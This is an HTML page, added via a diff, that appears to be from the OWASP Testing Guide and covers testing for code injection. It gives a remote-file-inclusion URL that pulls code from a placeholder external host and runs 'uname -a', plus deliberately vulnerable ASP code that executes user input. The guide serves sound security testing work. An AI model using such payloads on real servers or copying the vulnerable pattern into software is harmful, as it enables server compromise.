@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4.8.12 Testing for Code Injection  (OTG-INPVAL-012)  </title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">4.8.12 Testing for Code Injection  (OTG-INPVAL-012)  </h1><br/><br /><h2>Summary</h2><br />This section describes how a tester can check if it is possible to  enter code as input on a web page and have it executed by the web  server.  <br /><br />  In <a href="https://www.owasp.org/index.php/Code_Injection">Code Injection</a>  testing, a tester submits input that is processed by the web server as  dynamic code or as an included file.  These tests can target various  server-side scripting engines, e.g.., ASP or PHP. Proper input  validation and secure coding practices need to be employed to protect  against these attacks. <br /><br /><h2>How to Test</h2><br /><br /><h3>Black Box testing</h3><br /><br /><h3>Testing for PHP Injection vulnerabilities</h3><br />Using the querystring, the tester can inject code (in this example, a  malicious URL) to be processed as part of the included file: <br />http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a<br /><br /> <strong>Result Expected:</strong> <br />The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file. <br /><br /> <br /><br /><h3>Gray Box testing</h3><br /><br /><h3>Testing for ASP Code Injection vulnerabilities</h3><br />Examine ASP code for user input used in execution functions. Can the  user enter commands into the Data input field?  Here, the ASP code will  save the input to a file and then execute it: <br />&lt;%<br />If not isEmpty(Request( "Data" ) ) Then<br />Dim fso, f<br />'User input Data is written to a file named data.txt<br />Set fso = CreateObject("Scripting.FileSystemObject")<br />Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)<br />f.Write Request("Data") &amp; vbCrLf<br />f.close<br />Set f = nothing<br />Set fso = Nothing<br />'Data.txt is executed<br />Server.Execute( "data.txt" )<br />Else<br />%&gt;<br />&lt;form&gt;<br />&lt;input name="Data" /&gt;&lt;input type="submit" name="Enter Data" /&gt;<br />&lt;/form&gt;<br />&lt;%<br />End If<br />%&gt;)))<br /><br /> <br /><br /><h2>References</h2><br />•  Security Focus - <a href="http://www.securityfocus.com">http://www.securityfocus.com</a><br />•  Insecure.org - <a href="http://www.insecure.org">http://www.insecure.org</a><br />•  Wikipedia - <a href="http://www.wikipedia.org">http://www.wikipedia.org</a><br />•  Reviewing Code for <a href="https://www.owasp.org/index.php/OS_Injection">OS Injection</a> <br /><br /> <br /></div></body></html>
